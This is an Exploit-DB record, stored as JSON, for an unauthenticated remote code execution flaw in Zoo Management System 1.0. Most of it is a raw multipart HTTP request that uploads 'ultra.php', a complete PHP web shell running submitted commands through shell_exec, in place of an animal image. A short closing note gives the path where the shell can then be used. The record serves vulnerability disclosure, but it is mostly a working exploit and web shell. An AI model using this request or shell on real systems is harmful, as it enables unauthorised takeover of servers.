{"source": "https://www.exploit-db.com/exploits/51819", "vulnName": "Zoo Management System 1.0 - Unauthenticated RCE", "vulnEDBID": "51819", "vulnCVE": "N/A", "author": "\u00c7A\u011eATAY CEYHAN", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-02-27", "vulnContent": "# Exploit Title: Zoo Management System 1.0 - Unauthenticated RCE\n# Date: 16.10.2023\n# Exploit Author: \u00c7a\u011fatay Ceyhan\n# Vendor Homepage: https://www.sourcecodester.com/php/15347/zoo-management-system-source-code-php-mysql-database.html#google_vignette\n# Software Link: https://www.sourcecodester.com/download-code?nid=15347&title=Zoo+Management+System+source+code+in+PHP+with+MySQL+Database\n# Version: 1.0\n# Tested on: Windows 11\n\n## Unauthenticated users can access /zoomanagementsystem/admin/public_html/save_animal address and they can upload malicious php file instead of animal picture image without any authentication.\n\n\nPOST /zoomanagementsystem/admin/public_html/save_animal HTTP/1.1\nHost: localhost\nContent-Length: 6162\nCache-Control: max-age=0\nsec-ch-ua: \"Chromium\";v=\"117\", \"Not;A=Brand\";v=\"8\"\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"Windows\"\nUpgrade-Insecure-Requests: 1\nOrigin: http://localhost\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary8NY8zT5dXIloiUML\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: http://localhost/zoomanagementsystem/admin/public_html/save_animal\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-US,en;q=0.9\nConnection: close\n\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"animal_id\"\n\n\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"an_given_name\"\n\nkdkd\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"an_species_name\"\n\n\u0131ds\u0131d\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"an_dob\"\n\n1552-02-05\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"an_gender\"\n\nm\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"an_avg_lifespan\"\n\n3\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"class_id\"\n\n2\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"location_id\"\n\n2\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"an_dietary_req\"\n\n2\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"an_natural_habitat\"\n\nfaad\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"an_pop_dist\"\n\neterter\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"an_joindate\"\n\n5559-02-06\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"an_height\"\n\n2\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"an_weight\"\n\n3\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"an_description\"\n\n\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"images[]\"; filename=\"ultra.php\"\nContent-Type: application/octet-stream\n\n<?php\nif (!empty($_POST['cmd'])) {\n    $cmd = shell_exec($_POST['cmd']);\n}\n?>\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Web Shell</title>\n    <style>\n        * {\n            -webkit-box-sizing: border-box;\n            box-sizing: border-box;\n        }\n\n        body {\n            font-family: sans-serif;\n            color: rgba(0, 0, 0, .75);\n        }\n\n        main {\n            margin: auto;\n            max-width: 850px;\n        }\n\n        pre,\n        input,\n        button {\n            padding: 10px;\n            border-radius: 5px;\n            background-color: #efefef;\n        }\n\n        label {\n            display: block;\n        }\n\n        input {\n            width: 100%;\n            background-color: #efefef;\n            border: 2px solid transparent;\n        }\n\n        input:focus {\n            outline: none;\n            background: transparent;\n            border: 2px solid #e6e6e6;\n        }\n\n        button {\n            border: none;\n            cursor: pointer;\n            margin-left: 5px;\n        }\n\n        button:hover {\n            background-color: #e6e6e6;\n        }\n\n        .form-group {\n            display: -webkit-box;\n            display: -ms-flexbox;\n            display: flex;\n            padding: 15px 0;\n        }\n    </style>\n\n</head>\n\n<body>\n    <main>\n        <h1>Web Shell</h1>\n        <h2>Execute a command</h2>\n\n        <form method=\"post\">\n            <label for=\"cmd\"><strong>Command</strong></label>\n            <div class=\"form-group\">\n                <input type=\"text\" name=\"cmd\" id=\"cmd\" value=\"<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>\"\n                       onfocus=\"this.setSelectionRange(this.value.length, this.value.length);\" autofocus required>\n                <button type=\"submit\">Execute</button>\n            </div>\n        </form>\n\n        <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>\n            <h2>Output</h2>\n            <?php if (isset($cmd)): ?>\n                <pre><?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?></pre>\n            <?php else: ?>\n                <pre><small>No result.</small></pre>\n            <?php endif; ?>\n        <?php endif; ?>\n    </main>\n</body>\n</html>\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"an_med_record\"\n\n\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"an_transfer\"\n\n\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"an_transfer_reason\"\n\n\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"an_death_date\"\n\n\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"an_death_cause\"\n\n\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"an_incineration\"\n\n\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"m_gest_period\"\n\n\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"m_category\"\n\n\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"m_avg_body_temp\"\n\n\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"b_nest_const\"\n\n\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"b_clutch_size\"\n\n\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"b_wingspan\"\n\n\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"b_color_variant\"\n\n\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"f_body_temp\"\n\n\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"f_water_type\"\n\n\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"f_color_variant\"\n\n\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"rep_type\"\n\n\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"clutch_size\"\n\n\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"num_offspring\"\n\n\n------WebKitFormBoundary8NY8zT5dXIloiUML\nContent-Disposition: form-data; name=\"submit\"\n\n\n------WebKitFormBoundary8NY8zT5dXIloiUML--\n\n\n\n\n## After the post request sent by an attacker, the malicious file can be seen under the http://localhost/zoomanagementsystem/img/animals/. the attacker can execute arbitrary command on http://localhost/zoomanagementsystem/img/animals/ultra_1697442648.php.\n            "}